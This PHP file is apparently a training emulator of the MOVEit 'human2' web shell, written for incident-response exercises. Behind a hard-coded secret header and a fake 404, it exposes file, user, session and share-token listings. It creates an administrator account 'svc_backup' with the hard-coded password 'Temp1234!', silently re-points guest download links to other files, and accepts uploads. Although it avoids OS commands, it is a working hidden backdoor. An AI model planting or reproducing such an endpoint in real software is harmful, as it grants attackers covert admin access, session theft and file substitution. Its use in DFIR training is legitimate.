<?php
/*
 * Training-only MOVEit-inspired backdoor emulator.
 * Deliberately limited to application/database operations.
 * It does NOT execute OS commands or spawn processes.
 */

require_once '/var/www/src/db.php';

header('Content-Type: application/json; charset=utf-8');

const DEMO_KEY = 'lemur-demo-key';
const DEMO_PASSWORD = 'Temp1234!';

$key = $_SERVER['HTTP_X_MFT_KEY'] ?? '';

if (!hash_equals(DEMO_KEY, $key)) {
    http_response_code(404);
    echo json_encode(
        ['error' => 'not found'],
        JSON_UNESCAPED_UNICODE
    );
    exit;
}

$action = $_GET['action'] ?? 'list';

try {
    switch ($action) {

        /*
         * GET /human2.php?action=list
         *
         * List files stored in the MFT service.
         */
        case 'list':
            $sql = "
                SELECT
                    f.id,
                    f.owner_id,
                    u.username AS owner,
                    f.original_name,
                    f.storage_name,
                    f.created_at
                FROM files f
                JOIN users u ON u.id = f.owner_id
                ORDER BY f.id
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


        /*
         * GET /human2.php?action=users
         *
         * List application users.
         * Password hashes are intentionally not returned.
         */
        case 'users':
            $sql = "
                SELECT
                    id,
                    username,
                    role,
                    created_at
                FROM users
                ORDER BY id
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;

        /*
         * GET /human2.php?action=sessions
         *
         * Training-only visibility into DB-backed sessions.
         */
        case 'sessions':
            $sql = "
                SELECT
                    s.session_id,
                    s.user_id,
                    u.username,
                    u.role,
                    s.expires_at
                FROM sessions s
                JOIN users u ON u.id = s.user_id
                ORDER BY s.expires_at DESC
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


        /*
         * GET /human2.php?action=shares
         *
         * Shows Guest Download mappings.
         */
        case 'shares':
            $sql = "
                SELECT
                    s.id AS share_id,
                    s.file_id,
                    f.original_name,
                    f.storage_name,
                    s.token,
                    s.active
                FROM shares s
                JOIN files f ON f.id = s.file_id
                ORDER BY s.id
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


        /*
         * GET /human2.php?action=create_user&name=svc_backup
         *
         * Creates a training-only administrator account.
         * Password: Temp1234!
         */
        case 'create_user':
            $name = trim($_GET['name'] ?? 'svc_backup');

            if ($name === '') {
                http_response_code(400);
                echo json_encode(
                    ['error' => 'username required'],
                    JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            if (strlen($name) > 64) {
                http_response_code(400);
                echo json_encode(
                    ['error' => 'username too long'],
                    JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            $check = db()->prepare("
                SELECT id, username, role
                FROM users
                WHERE username = ?
            ");

            $check->execute([$name]);

            if ($check->fetch()) {
                http_response_code(409);
                echo json_encode(
                    [
                        'error' => 'user already exists',
                        'username' => $name
                    ],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            $hash = password_hash(
                DEMO_PASSWORD,
                PASSWORD_BCRYPT
            );

            $st = db()->prepare("
                INSERT INTO users (
                    username,
                    password_hash,
                    role
                )
                VALUES (?, ?, 'admin')
            ");

            $st->execute([
                $name,
                $hash
            ]);

            echo json_encode(
                [
                    'created' => true,
                    'id' => (int)db()->lastInsertId(),
                    'username' => $name,
                    'role' => 'admin',
                    'demo_password' => DEMO_PASSWORD
                ],
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


      case 'replace_share':
    /*
     * GET /human2.php?action=replace_share
     *     &token=<share token>
     *     &file_id=<new file id>
     *
     * Re-points an existing Guest Download share
     * to another file already registered in the MFT DB.
     */

    $token = trim($_GET['token'] ?? '');
    $newFileId = (int)($_GET['file_id'] ?? 0);

    if ($token === '' || $newFileId <= 0) {
        http_response_code(400);

        echo json_encode(
            [
                'error' => 'token and valid file_id are required'
            ],
            JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
        );
        exit;
    }

    /*
     * Check whether target file exists.
     */
    $fileCheck = db()->prepare("
        SELECT
            id,
            owner_id,
            original_name,
            storage_name
        FROM files
        WHERE id = ?
    ");

    $fileCheck->execute([$newFileId]);

    $targetFile = $fileCheck->fetch();

    if (!$targetFile) {
        http_response_code(404);

        echo json_encode(
            [
                'error' => 'target file not found',
                'file_id' => $newFileId
            ],
            JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
        );
        exit;
    }

    /*
     * Retrieve current share mapping.
     */
    $shareCheck = db()->prepare("
        SELECT
            s.id,
            s.file_id,
            s.token,
            s.active,
            f.original_name,
            f.storage_name
        FROM shares s
        JOIN files f ON f.id = s.file_id
        WHERE s.token = ?
        LIMIT 1
    ");

    $shareCheck->execute([$token]);

    $currentShare = $shareCheck->fetch();

    if (!$currentShare) {
        http_response_code(404);

        echo json_encode(
            [
                'error' => 'share not found'
            ],
            JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
        );
        exit;
    }

    $oldFileId = (int)$currentShare['file_id'];

    /*
     * Replace share target.
     */
    $update = db()->prepare("
        UPDATE shares
        SET file_id = ?
        WHERE token = ?
    ");

    $update->execute([
        $newFileId,
        $token
    ]);

    /*
     * Leave an application audit trail for DFIR training.
     */
    $audit = db()->prepare("
        INSERT INTO audit_logs (
            username,
            event_type,
            target,
            remote_ip,
            success,
            detail
        )
        VALUES (?, ?, ?, ?, ?, ?)
    ");

    $audit->execute([
        'human2',
        'SHARE_TARGET_CHANGE',
        $token,
        $_SERVER['REMOTE_ADDR'] ?? null,
        1,
        sprintf(
            'share file_id changed from %d to %d',
            $oldFileId,
            $newFileId
        )
    ]);

    echo json_encode(
        [
            'changed' => true,
            'share_id' => (int)$currentShare['id'],
            'token' => $token,

            'before' => [
                'file_id' => $oldFileId,
                'original_name' => $currentShare['original_name'],
                'storage_name' => $currentShare['storage_name']
            ],

            'after' => [
                'file_id' => (int)$targetFile['id'],
                'original_name' => $targetFile['original_name'],
                'storage_name' => $targetFile['storage_name']
            ]
        ],
        JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
    );

    exit;

        case 'upload':
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['error' => 'POST required']);
        exit;
    }

    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        http_response_code(400);
        echo json_encode(['error' => 'file required']);
        exit;
    }

    $uploadDir = '/var/www/storage/files';

    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0750, true);
    }

    $originalName = basename($_FILES['file']['name']);

    $storageName = 'f_' . bin2hex(random_bytes(8)) . '.bin';
    $destination = $uploadDir . '/' . $storageName;

    if (!move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {
        http_response_code(500);
        echo json_encode(['error' => 'upload failed']);
        exit;
    }

    // human2가 만든 관리자 계정(svc_backup)을 owner로 사용
    $owner = db()->prepare("
        SELECT id
        FROM users
        WHERE username = 'svc_backup'
        LIMIT 1
    ");

    $owner->execute();
    $user = $owner->fetch();

    if (!$user) {
        @unlink($destination);

        http_response_code(400);
        echo json_encode([
            'error' => 'svc_backup does not exist'
        ]);
        exit;
    }

    $insert = db()->prepare("
        INSERT INTO files (
            owner_id,
            original_name,
            storage_name
        )
        VALUES (?, ?, ?)
    ");

    $insert->execute([
        $user['id'],
        $originalName,
        $storageName
    ]);

    echo json_encode([
        'uploaded' => true,
        'file_id' => (int)db()->lastInsertId(),
        'original_name' => $originalName,
        'storage_name' => $storageName
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

    exit;

        default:
            http_response_code(400);

            echo json_encode(
                [
                    'error' => 'unknown action',
                    'available_actions' => [
                        'list',
                        'users',
                        'sessions',
                        'shares',
                        'create_user'
                    ]
                ],
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;
    }

} catch (PDOException $e) {
    http_response_code(500);

    echo json_encode(
        [
            'error' => 'database error'
        ],
        JSON_UNESCAPED_UNICODE
    );
    exit;
}

